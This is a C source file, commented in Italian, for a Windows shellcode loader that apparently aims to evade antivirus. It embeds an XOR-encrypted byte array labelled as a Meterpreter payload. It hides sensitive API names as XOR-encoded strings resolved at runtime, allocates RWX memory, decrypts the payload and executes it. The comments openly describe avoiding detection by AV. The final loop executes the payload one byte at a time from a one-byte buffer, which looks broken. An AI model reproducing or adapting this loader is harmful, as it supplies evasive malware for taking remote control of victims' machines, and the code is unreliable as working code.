#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


//queste typedef servono a fare Function Call Obfuscation, in pratica per evitare che queste 3 funzioni (che usate insieme possono destare sospetti) sia nella 
// IAT Import Address Table, mi creo un tipo puntatore che dopo otterra' effettivamente l' indirizzo a quelle funzioni con "GetProcAddress()" 
typedef LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flAllocationType,DWORD  flProtect);

typedef BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);

typedef VOID (WINAPI * pRtlMoveMemory)(VOID UNALIGNED *Destination,const VOID UNALIGNED *Source,SIZE_T Length);



//semplice XOR byte a byte


void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	//int j;

	//j = 0;
	for (int i = 0; i < data_len; i++) {
		//if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[i % (key_len - 1)];
		//j++;
	}
}
//void XOR(char * data, size_t data_len, char * key, size_t key_len) {
//    Sleep(1);
//}



int main(void) {

	void * exec_mem;  // puntatore a memoria allocata in READ & WRITE
	BOOL rv;          // return value di VirtualProtect
	HANDLE th;        // Handle al thread
    DWORD oldprotect = 0; //a variable that receives the previous access protection value of the first page in the specified region of pages 
    //bho sinceramente non lo so che e' sta oldprotect, serve in VirtualProtect

    //FreeConsole();               // se vuoi evitare di far apparire il prompt dei comandi

	unsigned char key[] = "Secur3K3y12@35%";  // chiave per decryptare il payload e le stringhe

    unsigned char payload_key[] = "chiavesicurissimaindecifrabile";

    //meterpreter criptato in XOR

    unsigned char payload_meterpreter[] = { 0x9f, 0x20, 0xea, 0x85, 0x86, 0x8d, 0xbf, 0x69, 0x63, 0x75, 0x33, 0x38, 0x32, 0x23, 0x3b, 0x25, 0x50, 0xbb, 0x3f, 0x1, 0x2d, 0xe8, 0x3b, 0x6, 0x3a, 0xea, 0x30, 0x71, 0x24, 0xee, 0x31, 0x48, 0x3f, 0x29, 0x79, 0xd2, 0x39, 0x23, 0x2b, 0xfe, 0x0, 0x39, 0x3e, 0x42, 0xa0, 0x25, 0x50, 0xa9, 0xc2, 0x58, 0x4, 0x1f, 0x6b, 0x4a, 0x52, 0x20, 0xa3, 0xa0, 0x61, 0x24, 0x62, 0xa9, 0x8b, 0x8c, 0x24, 0x24, 0x22, 0x21, 0xe8, 0x27, 0x52, 0xe2, 0x31, 0x4f, 0x21, 0x6c, 0xb1, 0xf, 0xef, 0x1c, 0x7d, 0x68, 0x6b, 0x69, 0xf7, 0x13, 0x62, 0x69, 0x6c, 0xee, 0xe3, 0xe0, 0x69, 0x61, 0x76, 0x2d, 0xf6, 0xa9, 0x17, 0x12, 0x3a, 0x68, 0xa3, 0x23, 0xe2, 0x25, 0x79, 0x2d, 0xe5, 0x24, 0x45, 0x2a, 0x68, 0xb6, 0x91, 0x37, 0x2f, 0x58, 0xa5, 0x2d, 0x9c, 0xa1, 0x28, 0xea, 0x42, 0xed, 0x3b, 0x68, 0xb5, 0x3d, 0x43, 0xa9, 0xdf, 0x32, 0xa8, 0xa4, 0x6c, 0x28, 0x6f, 0xa5, 0x5d, 0x83, 0x1c, 0x97, 0x3e, 0x62, 0x2e, 0x4d, 0x64, 0x20, 0x5a, 0xb9, 0x1c, 0xb9, 0x2e, 0x21, 0xf8, 0x29, 0x47, 0x3c, 0x73, 0xb9, 0x15, 0x32, 0xe2, 0x61, 0x29, 0x2d, 0xe5, 0x24, 0x79, 0x2a, 0x68, 0xb6, 0x33, 0xea, 0x66, 0xe1, 0x24, 0x64, 0xb3, 0x29, 0x31, 0x20, 0x2e, 0x3b, 0x2a, 0x33, 0x22, 0x2d, 0x33, 0x30, 0x32, 0x29, 0x21, 0xee, 0x8d, 0x49, 0x2f, 0x36, 0x9a, 0x83, 0x31, 0x27, 0x2b, 0x3b, 0x2a, 0xe2, 0x7e, 0x8c, 0x28, 0x97, 0x96, 0x9e, 0x2b, 0x2c, 0xcd, 0x1e, 0x10, 0x47, 0x2d, 0x5a, 0x41, 0x73, 0x69, 0x2c, 0x37, 0x20, 0xe7, 0x82, 0x2d, 0xe2, 0x85, 0xc6, 0x73, 0x61, 0x62, 0x20, 0xe5, 0x80, 0x2a, 0xd4, 0x6b, 0x61, 0x67, 0x39, 0xb3, 0xc1, 0x62, 0x29, 0x33, 0x3d, 0x3a, 0xfa, 0x8d, 0x21, 0xe8, 0x98, 0x2f, 0xde, 0x29, 0x14, 0x4f, 0x61, 0x8d, 0xb4, 0x2e, 0xe0, 0x86, 0xd, 0x62, 0x69, 0x69, 0x61, 0x2f, 0x24, 0xc9, 0x40, 0xe3, 0x1e, 0x72, 0x96, 0xa6, 0x19, 0x63, 0x2c, 0x3f, 0x39, 0x3e, 0x29, 0x54, 0xaa, 0x24, 0x57, 0xb2, 0x29, 0x9d, 0xa9, 0x24, 0xec, 0xa1, 0x20, 0x96, 0xa1, 0x3e, 0xec, 0xb2, 0x28, 0xd9, 0x9f, 0x7d, 0xb6, 0x93, 0x8c, 0xbc, 0x25, 0xe8, 0xae, 0x4, 0x74, 0x24, 0x3b, 0x25, 0xef, 0x90, 0x29, 0xeb, 0x90, 0x2d, 0xdf, 0xfa, 0xcd, 0x1d, 0x0, 0x89, 0xb0, 0xf6, 0xa9, 0x17, 0x7f, 0x3b, 0x96, 0xbd, 0x6, 0x8c, 0x85, 0xf2, 0x69, 0x6e, 0x64, 0x2d, 0xe0, 0x85, 0x76, 0x3a, 0xe8, 0x80, 0x24, 0x5d, 0xac, 0x9, 0x6c, 0x28, 0x39, 0x3e, 0xec, 0x8a, 0x28, 0xd9, 0x77, 0xab, 0xa1, 0x2c, 0x8c, 0xbc, 0xee, 0x99, 0x69, 0x10, 0x31, 0x2d, 0xe0, 0xad, 0x46, 0x2c, 0xe8, 0x94, 0x3, 0x2c, 0x24, 0x3a, 0x0, 0x69, 0x71, 0x76, 0x65, 0x32, 0x31, 0x2b, 0xfc, 0x80, 0x21, 0x42, 0xba, 0x28, 0xd7, 0x39, 0xcd, 0x3d, 0x81, 0x9a, 0xb6, 0x21, 0xef, 0xb1, 0x28, 0xeb, 0xae, 0x21, 0x54, 0xaa, 0x21, 0xe0, 0x91, 0x3e, 0xec, 0xa9, 0x21, 0xea, 0x8c, 0x33, 0xd3, 0x71, 0xaa, 0xa1, 0x32, 0x9e, 0xbc, 0xed, 0x9c, 0x65, 0x1e, 0x41, 0x3e, 0x33, 0x36, 0x3b, 0x1, 0x6c, 0x25, 0x63, 0x68, 0x28, 0x39, 0x1c, 0x65, 0x29, 0x28, 0xd9, 0x7e, 0x5d, 0x66, 0x43, 0x8c, 0xbc, 0x3a, 0x38, 0x28, 0xd4, 0x11, 0xb, 0x2e, 0x8, 0x99, 0xa7, 0x28, 0x9d, 0xa7, 0x85, 0x59, 0x9c, 0x97, 0x96, 0x29, 0x77, 0xa6, 0x3b, 0x40, 0xa5, 0x3d, 0xf7, 0x9f, 0x6, 0xc7, 0x28, 0x92, 0x86, 0x31, 0x4, 0x64, 0x3c, 0x2a, 0xae, 0xa4, 0x82, 0xd4, 0xc0, 0x3f, 0x93, 0xb0 };

	unsigned int payload_len = sizeof(payload_meterpreter);

    //dichiaro puntatori alle 3 funzioni 'sensibili' che non voglio nella IAT
    pVirtualAlloc pVA;
    pVirtualProtect pVP;
    pRtlMoveMemory pRMM;


    /*
    unsigned char RMM [] = "RtlMoveMemory";
    XOR((char *)RMM, sizeof(RMM),(char *)key, sizeof(key));
    
    for (int i = 0; i < sizeof(RMM); i++){
        printf("0x%02x, ", RMM[i]);
    }
    */
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// IN QUESTA SEZIONE DATO CHE VOGLIO CHIAMARE LE FUNZIONI 1)"VirtualAlloc" 2)"VirtualProtect" 3)"RtlMoveMemory" ma non voglio che siano stringhe in plaintext altrimenti gli AV potrebbero notare
// allora mi salvo le stringhe gia' XORate con la stessa chiave del payload e le decripto in runtime
    unsigned char RMM [] = { 0x1, 0x11, 0xf, 0x38, 0x1d, 0x45, 0x2e, 0x7e, 0x1c, 0x5c, 0x5d, 0x32, 0x4a, 0x35 };
    

    //unsigned char VA [] = "VirtualAlloc";
    unsigned char VA [] = { 0x5, 0xc, 0x11, 0x1, 0x7, 0x52, 0x27, 0x72, 0x15, 0x5d, 0x5d, 0x23, 0x33 }; //stringa "VirtualAlloc" criptata in XOR
    /*
    for (int i = 0; i < sizeof(VP); i++){
        printf("0x%02x, ", VP[i]);

    }
    */

    //unsigned char VP [] = "VirtualProtect";
    unsigned char VP [] = { 0x5, 0xc, 0x11, 0x1, 0x7, 0x52, 0x27, 0x63, 0xb, 0x5e, 0x46, 0x25, 0x50, 0x41, 0x25 }; //stringa "VirtualProtect" criptata in XOR
    /*
    for (int i = 0; i < sizeof(VP); i++){
        printf("0x%02x, ", VP[i]);

    }
    */
    XOR((char *)VA, sizeof(VA),(char *)key, sizeof(key));
    XOR((char *)VP, sizeof(VP),(char *)key, sizeof(key));
    XOR((char *)RMM, sizeof(RMM),(char *)key, sizeof(key));
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    //prendo gli indirizzi delle 3 funzioni 'sensibili'
    pVA = (pVirtualAlloc) GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (char *)VA);
    pVP = (pVirtualProtect) GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), (char *)VP);
    pRMM = (pRtlMoveMemory) GetProcAddress(GetModuleHandle(TEXT("Ntdll.dll")), (char *)RMM);



    //decripto il payload

    //stampo il payload decriptato per controllare se va bene, solo [DEBUG]
    for (int i = 0; i < payload_len; i++){
       printf("0x%02x ", payload_meterpreter[i]);

    }
	
    printf("\n%s\n",VA);
    printf("%s",VP);


    // prima alloco memoria read-write perche' se la allocassi subito pure Execute gli AV potrebbero insospettirsi
	exec_mem = pVA(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	printf("%-20s : 0x%-016p\n", "payload addr", (void *)payload_meterpreter);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);



	// Decripta il payload
	//AESDecrypt((char *) payload_meterpreter, payload_len, key, sizeof(key));



	// copio il payload nel buffer allocato prima con VirtualAlloc
	pRMM(exec_mem, payload_meterpreter, payload_len);

    //memcpy(exec_mem, payload_meterpreter, payload_len);

	// Ora rendo il buffer eseguibile perche' allocar subito il buffer Read Write e Execute puo' insospettire gli AV
	//rv = pVP(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    //printf("%d", rv);

    XOR((char *)exec_mem, payload_len, (char *)payload_key, sizeof(payload_key));

    //se tutto ok lancia il payload

    int key_len = sizeof(payload_key);




    //Sleep(3500);
    void *func_byte_mem = pVA(0, sizeof(unsigned char), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (func_byte_mem == NULL) {
        printf("Error: Failed to allocate memory for func_byte_mem\n");
        return 1;
    }

    for (int i = 0; i < payload_len; i++) {
        unsigned char func_byte = ((char *)exec_mem)[i];
        printf("0x%02x ", func_byte);
        Sleep(1000);

        pRMM(func_byte_mem, &func_byte, sizeof(func_byte));

        printf("%-20s : 0x%-016p\n", "func_byte_mem addr", (void *)func_byte_mem);

        Sleep(1000);
        ((void(*)())func_byte_mem)();
        Sleep(1000);

    }

    //inizializzo un thread che in callback esegue il codice nel buffer
    //Sleep(2000);

    //((void(*)())exec_mem)(); 
    //memset(exec_mem, 0, payload_len);

    //}

    return 0;
}